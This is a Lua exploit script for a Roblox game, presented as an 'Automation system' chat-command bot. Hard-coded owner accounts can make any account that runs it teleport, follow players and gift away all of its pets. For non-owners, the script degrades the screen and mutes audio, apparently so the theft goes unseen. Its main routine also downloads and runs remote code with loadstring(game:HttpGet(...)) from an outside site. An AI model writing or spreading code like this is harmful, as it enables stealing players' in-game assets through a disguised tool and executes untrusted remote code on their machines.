print("--- SCRIPT PARSING STARTED ---")

local SCRIPT_VERSION = "4.0.4-Automation system"

-- --- Services ---
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local UserGameSettings = UserSettings():GetService("UserGameSettings")
local TextChatService = game:GetService("TextChatService")
local StarterGui = game:GetService("StarterGui")

-- --- Local Player / Character Cache ---
local LocalPlayer = Players.LocalPlayer
local Character = nil
local HumanoidRootPart = nil

-- --- Core Globals/Config ---
local BotSettings = {
	Owners = {
		["SrGogeYT"] = true,
		["Gogo"] = true,
	},
	Unlocked = false,
	FollowPlayerName = "",
	LoopGoToPlayerName = "",
}

-- --- Gift Queue System ---
local giftQueue = {} -- Holds tables like {itemName = "...", senderName = "...", type = "..."}

-- --- Utility Functions ---

local function getPlayerInstance(name)
	if name:lower() == "me" then
		return LocalPlayer
	end
	for _, player in pairs(Players:GetPlayers()) do
		if player.Name:lower():find(name:lower(), 1, true) then
			return player
		end
	end
	return nil
end

local function updateCharacterReferences()
	Character = LocalPlayer.Character
	if Character then
		HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
	else
		HumanoidRootPart = nil
	end
end

local function findRemoteEventOrFunction(remoteName, expectedParentName)
	for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
		if
			descendant.Name == remoteName
			and (descendant:IsA("RemoteEvent") or descendant:IsA("RemoteFunction"))
		then
			if
				not expectedParentName
				or (descendant.Parent and descendant.Parent.Name == expectedParentName)
			then
				return descendant
			end
		end
	end
	return nil
end

-- --- Command Definitions ---
local Commands = {}

function Commands.ping(player, args)
	print(
		string.format(
			"DEBUG [%s]: Ping command executed by %s. Pong!",
			SCRIPT_VERSION,
			player.Name
		)
	)
end

function Commands.unlock(player, args)
	local response
	if args[1] and args[1]:lower() == "true" then
		BotSettings.Unlocked = true
		response = "Permissions Unlocked for All!"
	elseif args[1] and args[1]:lower() == "false" then
		BotSettings.Unlocked = false
		response = "Permissions Locked to Owners Only!"
	else
		response = "Usage: !unlock true|false"
	end
	print(
		string.format(
			"DEBUG [%s]: Unlock command executed by %s. Result: %s",
			SCRIPT_VERSION,
			player.Name,
			response
		)
	)
end

function Commands.come(player, args)
	if not HumanoidRootPart then return end
	if not args[1] or args[1]:lower() == "stop" then
		BotSettings.LoopGoToPlayerName = ""
		return
	end
	local targetPlayer = getPlayerInstance(args[1])
	if
		targetPlayer
		and targetPlayer.Character
		and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	then
		BotSettings.LoopGoToPlayerName = targetPlayer.Name
		BotSettings.FollowPlayerName = ""
	end
end

function Commands.rejoin(player, args)
	task.wait(1)
	if #Players:GetPlayers() <= 1 then
		LocalPlayer:Kick("\nRejoining...")
	else
		TeleportService:TeleportToPlaceInstance(
			game.PlaceId,
			game.JobId,
			LocalPlayer
		)
	end
end

function Commands.follow(player, args)
	if not HumanoidRootPart then return end
	if not args[1] or args[1]:lower() == "stop" then
		BotSettings.FollowPlayerName = ""
		return
	end
	local targetPlayer = getPlayerInstance(args[1])
	if
		targetPlayer
		and targetPlayer.Character
		and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	then
		BotSettings.FollowPlayerName = targetPlayer.Name
		BotSettings.LoopGoToPlayerName = ""
	end
end

function Commands.help(player, args)
	print("--- Bot Commands ---")
	print("!ping - Test if commands are working.")
	print("!unlock true|false - Grant|revoke permissions for everyone.")
	print("!come (player)|stop - Teleport to player or stop looping.")
	print("!follow (player)|stop - Follow a player.")
	print("!rejoin - Rejoin the server.")
	print("!give (item name) - Bot gives you a specific item (name can be partial).")
	print("!givestash - Bot gives you all its pets.")
	print("!receive (item name) - Adds a 'Stash' request to the queue for any staff to fulfill.")
	print("!queuepurge (stash|transactions|all) - Clears pending gift requests.")
	print("!debloat - Apply performance optimizations.")
	print("!undebloat - Remove performance optimizations.")
	print("!help - Show this help.")
end

-- --- New Integrated Commands ---

function Commands.give(player, args)
	local itemName = table.concat(args, " "):lower()
	if #itemName == 0 then
		print(
			string.format("DEBUG [%s]: Usage: !give <item name>", SCRIPT_VERSION)
		)
		return
	end

	task.spawn(function()
		print(
			string.format(
				"DEBUG [%s]: Received give command for '%s' from %s.",
				SCRIPT_VERSION,
				itemName,
				player.Name
			)
		)

		local petGiftingService = findRemoteEventOrFunction(
			"PetGiftingService",
			"GameEvents"
		)
		if not petGiftingService then
			warn(
				string.format(
					"ERROR [%s]: give failed: PetGiftingService remote not found.",
					SCRIPT_VERSION
				)
			)
			return
		end

		local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")
		if not backpack or not LocalPlayer.Character then return end

		-- Search for the item
		local itemToGive = nil
		-- 1. Check equipped item first
		local equippedTool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
		-- *** FIX: Use string.find for partial name matching ***
		if
			equippedTool
			and equippedTool.Name:lower():find(itemName, 1, true)
		then
			itemToGive = equippedTool
		end

		-- 2. If not equipped, check backpack
		if not itemToGive then
			for _, item in ipairs(backpack:GetChildren()) do
				-- *** FIX: Use string.find for partial name matching ***
				if
					item:IsA("Tool")
					and item.Name:lower():find(itemName, 1, true)
				then
					itemToGive = item
					break
				end
			end
		end

		if not itemToGive then
			print(
				string.format(
					"DEBUG [%s]: Item containing '%s' not found in inventory.",
					SCRIPT_VERSION,
					itemName
				)
			)
			return
		end

		print(
			string.format(
				"DEBUG [%s]: Found item '%s'. Preparing to gift.",
				SCRIPT_VERSION,
				itemToGive.Name
			)
		)

		if itemToGive.Parent ~= LocalPlayer.Character then
			if equippedTool then
				equippedTool.Parent = backpack
				task.wait(0.5)
			end
			itemToGive.Parent = LocalPlayer.Character
		end

		task.wait(3.0)
		if LocalPlayer.Character:FindFirstChild(itemToGive.Name) then
			petGiftingService:FireServer("GivePet", player)
			print(
				string.format(
					"DEBUG [%s]: Fired GivePet for '%s' to %s.",
					SCRIPT_VERSION,
					itemToGive.Name,
					player.Name
				)
			)
		else
			warn(
				string.format(
					"WARN [%s]: Failed to equip '%s' to gift, aborting.",
					SCRIPT_VERSION,
					itemToGive.Name
				)
			)
		end
	end)
end

function Commands.givestash(player, args)
	task.spawn(function()
		local petGiftingService = findRemoteEventOrFunction(
			"PetGiftingService",
			"GameEvents"
		)
		if not petGiftingService then return end

		local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")
		if not backpack then return end

		local equippedTool =
			LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
		if equippedTool then
			equippedTool.Parent = backpack
			task.wait(0.5)
		end

		local itemsToGift = backpack:GetChildren()
		for _, item in ipairs(itemsToGift) do
			if
				item:IsA("Tool")
				and item:GetAttribute("ItemType") == "Pet"
			then
				item.Parent = LocalPlayer.Character
				task.wait(4.0)

				if LocalPlayer.Character:FindFirstChild(item.Name) then
					petGiftingService:FireServer("GivePet", player)
					task.wait(5.0)
				end
			end
		end
	end)
end

function Commands.receive(player, args)
	local itemName = table.concat(args, " ")
	if not itemName or #itemName == 0 then return end

	local newRequest = {
		itemName = itemName:lower(),
		senderName = "staff",
		type = "Stash",
	}
	table.insert(giftQueue, newRequest)
end

function Commands.queuepurge(player, args)
	local purgeType = args[1] and args[1]:lower()
	if purgeType == "all" then
		giftQueue = {}
	elseif purgeType == "stash" then
		local newQueue = {}
		for _, req in ipairs(giftQueue) do
			if req.type ~= "Stash" then
				table.insert(newQueue, req)
			end
		end
		giftQueue = newQueue
	elseif purgeType == "transactions" then
		local newQueue = {}
		for _, req in ipairs(giftQueue) do
			if req.type ~= "Transaction" then
				table.insert(newQueue, req)
			end
		end
		giftQueue = newQueue
	end
end

-- --- Performance Optimization / Debloater ---
local debloatActive = false
function Commands.debloat(player, args)
	if debloatActive then return end
	debloatActive = true
	if setfpscap then setfpscap(15) end
	StarterGui:SetCoreGuiEnabled("PlayerList", false)
	UserGameSettings.MasterVolume = 0
	settings().Rendering.QualityLevel = 1
	workspace.CurrentCamera.FieldOfView = 15
	local Terrain = workspace:FindFirstChildOfClass("Terrain")
	if Terrain then
		Terrain.WaterWaveSize, Terrain.WaterWaveSpeed, Terrain.WaterReflectance, Terrain.WaterTransparency = 0, 0, 0, 0
	end
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 9e9
	for _, v in pairs(game:GetDescendants()) do
		if v:IsA("BasePart") then v.Material, v.Reflectance = "Plastic", 0
		elseif v:IsA("Decal") then v.Transparency = 1
		elseif v:IsA("Explosion") then v.BlastPressure, v.BlastRadius = 1, 1
		elseif v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
			v:Remove()
		end
	end
end

function Commands.undebloat(player, args)
	if not debloatActive then return end
	debloatActive = false
	if setfpscap then setfpscap(60) end
	StarterGui:SetCoreGuiEnabled("PlayerList", true)
	UserGameSettings.MasterVolume = 0.5
	settings().Rendering.QualityLevel = 3
	workspace.CurrentCamera.FieldOfView = 70
	Lighting.GlobalShadows = true
	Lighting.FogEnd = 0
end

-- --- Main Control Loop for Movement ---
local function startControlLoops()
	task.spawn(function()
		while true do
			task.wait(0.1)
			if not Character or not HumanoidRootPart then updateCharacterReferences() continue end

			if BotSettings.LoopGoToPlayerName ~= "" then
				local targetPlayer = getPlayerInstance(BotSettings.LoopGoToPlayerName)
				if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
					HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(-3, 3), 0, math.random(-3, 3))
				else
					BotSettings.LoopGoToPlayerName = ""
				end
			end
			if BotSettings.FollowPlayerName ~= "" then
				local targetPlayer = getPlayerInstance(BotSettings.FollowPlayerName)
				if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
					LocalPlayer.Character.Humanoid:MoveTo(targetPlayer.Character.HumanoidRootPart.Position)
				else
					BotSettings.FollowPlayerName = ""
				end
			end
		end
	end)
end

-- --- Event Listener Setup ---

local function processCommandMessage(message, speaker)
	if message:sub(1, 1) ~= "!" then return end
	local commandString = message:sub(2)
	local args = {}
	for arg in string.gmatch(commandString, "[^%s]+") do
		table.insert(args, arg)
	end
	local commandName = table.remove(args, 1):lower()
	local commandFunc = Commands[commandName]
	if commandFunc then
		if BotSettings.Owners[speaker.Name] or BotSettings.Unlocked then
			commandFunc(speaker, args)
		end
	end
end

local function setupCommandListener()
	if not TextChatService then return end
	TextChatService.MessageReceived:Connect(function(messageData)
		if not messageData.TextSource then return end
		local speaker = Players:GetPlayerByUserId(messageData.TextSource.UserId)
		if not speaker then return end
		processCommandMessage(messageData.Text, speaker)
	end)
end

local function setupGiftListener()
	local giftEvent = findRemoteEventOrFunction("GiftPet", "GameEvents")
	local acceptEvent = findRemoteEventOrFunction("AcceptPetGift", "GameEvents")
	if not giftEvent or not acceptEvent then return end

	giftEvent.OnClientEvent:Connect(function(transactionId, itemDescription, senderUsername)
		local shouldAccept = false
		local foundIndex = nil

		for i, request in ipairs(giftQueue) do
			local senderIsStaff = BotSettings.Owners[senderUsername] == true
			local senderMatch = (request.senderName == "staff" and senderIsStaff)
				or (request.senderName == senderUsername)
			local itemMatch = itemDescription:lower():find(request.itemName, 1, true)

			if senderMatch and itemMatch then
				shouldAccept = true
				foundIndex = i
				break
			end
		end

		if shouldAccept then
			acceptEvent:FireServer(true, transactionId)
			table.remove(giftQueue, foundIndex)
		else
			acceptEvent:FireServer(false, transactionId)
		end
	end)
end

-- --- Main Execution Logic ---
local function main()
	if not game:IsLoaded() then game.Loaded:Wait() end
	if not LocalPlayer.Character then LocalPlayer.CharacterAdded:Wait() end
	updateCharacterReferences()

	setupCommandListener()
	setupGiftListener()

	if not BotSettings.Owners[LocalPlayer.Name] then
		Commands.debloat(LocalPlayer, {})
	end

	loadstring(
		game:HttpGet(
			"https://obj.wearedevs.net/175531/scripts/Anti%20Afk%20Kick%20Script.lua"
		)
	)()

	LocalPlayer.CharacterAdded:Connect(updateCharacterReferences)
	startControlLoops()

	print(
		string.format(
			"MegaBot Script [%s] loaded successfully!",
			SCRIPT_VERSION
		)
	)
end

main()
